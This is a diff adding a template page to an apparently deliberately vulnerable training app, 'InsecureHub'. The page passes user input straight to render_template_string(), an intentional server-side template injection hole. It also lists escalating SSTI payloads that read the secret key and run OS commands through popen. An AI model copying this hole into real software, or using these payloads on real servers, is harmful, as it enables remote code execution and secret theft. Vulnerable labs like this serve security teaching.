@@ -1,0 +1,46 @@
+{% extends "base.html" %}
+{% block title %}Template Renderer — InsecureHub{% endblock %}
+{% block content %}
+<div class="page-container">
+    <div class="page-header">
+        <h1 class="page-title">🔥 Template Renderer</h1>
+        <p class="page-subtitle">Render Jinja2 templates — SSTI vulnerability active</p>
+    </div>
+
+    <div class="form-card">
+        <form method="POST" action="{{ url_for('render_template_page') }}" class="form" id="render-form">
+            <div class="form-group">
+                <label class="form-label" for="template">Jinja2 Template</label>
+                <textarea id="template" name="template" class="form-textarea code-textarea" rows="8"
+                    placeholder="Enter Jinja2 template here...">{{ template_input }}</textarea>
+                <div class="form-hint">Your input is passed directly to render_template_string(). Full Jinja2 execution!
+                </div>
+            </div>
+            <button type="submit" class="btn btn-primary" id="render-btn">Render Template</button>
+        </form>
+    </div>
+
+    {% if output is not none %}
+    <div class="result-card">
+        <div class="result-header">
+            <span class="result-title">📄 Rendered Output</span>
+        </div>
+        <pre class="result-body">{{ output }}</pre>
+    </div>
+    {% endif %}
+
+    <div class="hint-box hint-vuln">
+        <span class="hint-title">🔥 SSTI Payloads — Escalating Severity</span>
+        <div class="payload-list">
+            <code>{{ '{{' }} 7*7 {{ '}}' }}</code>
+            <code>{{ '{{' }} config.SECRET_KEY {{ '}}' }}</code>
+            <code>{{ '{{' }} config {{ '}}' }}</code>
+            <code>{{ '{{' }} ''.__class__.__mro__[1].__subclasses__() {{ '}}' }}</code>
+            <code>{{ '{{' }} ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['os'].popen('id').read() {{ '}}' }}</code>
+            <code>{{ '{{' }} request.application.__globals__.__builtins__.__import__('os').popen('whoami').read() {{ '}}' }}</code>
+        </div>
+        <p class="hint-note">⚠ The subclass index may vary. Use the subclasses payload first to find the right index.
+        </p>
+    </div>
+</div>
+{% endblock %}
